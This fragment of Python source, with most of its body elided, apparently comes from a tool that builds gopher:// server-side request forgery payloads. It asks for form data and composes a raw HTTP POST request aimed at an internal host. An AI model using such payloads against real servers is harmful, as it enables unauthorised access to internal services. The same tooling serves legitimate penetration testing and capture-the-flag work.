...
def main():
    ...
    data_sent = input(f"{Style.BRIGHT}Provide `{Fore.GREEN}sent-data{Style.RESET_ALL}{Style.BRIGHT}` as query parameters (Ex: {Fore.GREEN}username=hehe&password=hehe{Style.RESET_ALL} ):\n")
    print("")
    ...
    payload_gopher = f"{Style.BRIGHT}{Fore.GREEN}gopher://{internal_domain_ip}/_POST {endpoint}?{data_sent} HTTP/1.1\nHost: {internal_domain_ip_only}\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nAccept: */*\nContent-Length: {content_length}\n\n"
    print("")
    print("")
    print(f"{Style.BRIGHT}{Fore.BLUE}OPTION-4: gopher-post-basic: The data-sent is in URL{Style.RESET_ALL}{Style.BRIGHT}{Fore.BLUE}")
